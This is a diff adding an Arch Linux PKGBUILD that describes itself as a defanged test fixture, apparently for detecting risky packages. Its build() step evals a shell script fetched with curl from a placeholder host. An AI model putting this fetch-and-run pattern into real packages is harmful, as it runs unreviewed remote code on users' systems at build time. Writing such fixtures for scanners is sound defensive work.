@@ -1,0 +1,14 @@
+# Maintainer: Fixture Maintainer <fixture@example.invalid>
+pkgname=curated-eval-network-decode-combo
+pkgver=1.0
+pkgrel=1
+pkgdesc="Defanged eval network/decode fixture"
+arch=("x86_64")
+url="https://example.invalid/curated-eval-network-decode-combo"
+license=("MIT")
+source=("https://example.invalid/curated-eval-network-decode-combo-1.0.tar.gz")
+sha256sums=("ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
+
+build() {
+  eval "$(curl https://example.invalid/defanged-payload.sh)"
+}
